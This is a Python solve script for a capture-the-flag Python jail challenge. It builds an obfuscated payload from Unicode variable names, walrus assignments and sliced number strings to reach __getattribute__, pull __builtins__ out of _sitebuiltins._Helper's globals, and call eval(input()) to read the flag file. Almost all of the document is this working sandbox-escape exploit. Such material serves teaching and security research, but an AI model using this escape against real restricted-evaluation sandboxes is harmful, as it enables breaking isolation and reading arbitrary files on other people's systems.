import subprocess

def oracle(code, err=None):
    with open('code.py', 'w') as f:
        f.write(code)
    print('CODE LEN:', len(code))
    p = subprocess.Popen(['python3.9', './chal.py'], stdin=subprocess.PIPE, stderr=(err and subprocess.DEVNULL), stdout=subprocess.PIPE)
    p.stdin.write((code + '\n').encode())
    p.stdin.flush()
    return p.stdout.read()

def sym(i):
    return chr(0x5000+i)

if 0:
    seen = set()
    for i in [2158]:
        pad = '+'.join(map(str, range(i)))
        resp = oracle(f'[] and (0/0+{pad}) or -1')
        if resp not in seen:
            print(i, resp.decode().strip())
            seen.add(resp)

if 1:
    npad = '+'.join(map(sym, range(2400)))
    __getattribute__ = sym(2158)
    t = sym(989)
    cpad = '+'.join(map(str, range(1000)))
    n0 = sym(935)
    n1 = sym(936)
    n2 = sym(937)
    n4 = sym(938)
    n8 = sym(939)
    __dict__ = sym(940)
    values = sym(941)
    ga = sym(942)
    __class__ = sym(943)
    n16 = sym(944)
    n32 = sym(945)
    n64 = sym(946)
    hlp = sym(947)
    fun = sym(948)
    __globals__ = sym(949)
    sice = sym(950)

    def lit(n):
        bits = [n1, n2, n4, n8, n16, n32, n64]
        out = []
        for i in range(8):
            if n>>i&1:
                out.append(bits[i])
        if not out:
            return n0
        else:
            return '+'.join(out)

    resp = oracle(
        f'[] and ({npad}) or [] and (0/0+{cpad})'
        f'or ({n0}:=not[[]])or({n1}:=(not[])+{n0})and({n2}:={n1}+{n1})and({n4}:={n2}+{n2})and({n8}:={n4}+{n4})and({n16}:={n8}+{n8})and({n32}:={n16}+{n16})and({n64}:={n32}+{n32})'

        # "values"
        f'and ({values}:=f"{{168}}"[{n8}+{n4}+{n1}:-{n2}])'

        # "__dict__"
        f'and ({__dict__}:=796[{n0}]*{n2} + f"{{150}}"[{n8}:{n8}+{n4}] + 796[{n0}]*{n2})'

        # "__class__"
        f'and ({__class__}:=796[{n0}]*{n2} + f"{{4}}"[{n1}:{n4}+{n2}] + 796[{n0}]*{n2})'

        # object.__getattribute__
        f'and ({ga}:=(6).{__getattribute__})'

        # _sitebuiltins._Helper
        f'and ({hlp}:=[*{ga}({ga}({ga}(6,{__class__}),{__dict__}),{values})()][{n8}](6)[-{n1}])'

        # _sitebuiltins._Helper.__call__
        f'and ({fun}:=[*{ga}({ga}({hlp},{__dict__}),{values})()][-{n1}-{n2}])'

        # _sitebuiltins._Helper.__call__.__globals__
        f'and ({__globals__}:=796[{n0}]*{n2} + 988[{lit(114)}:{lit(120)}] + 797[{n1}] + 796[{n0}]*{n2})'

        # _sitebuiltins._Helper.__call__.__globals__['__builtins__']
        f'and ({sice}:=[*{ga}([*{ga}({ga}({fun},{__globals__}),{values})()][{n8}-{n1}],{values})()])'

        # eval(input(), __builtins__ from _sitebuiltins._Helper)
        # the second arg to eval is needed because the challenge trashed our own __builtins__
        f'and {sice}[{lit(19)}]({sice}[{lit(28)}](),{ga}({fun},{__globals__}))'

        # input to input()
        + '\nprint(open("/home/ctf/flag").read())'
    )
    print(resp.decode().strip())
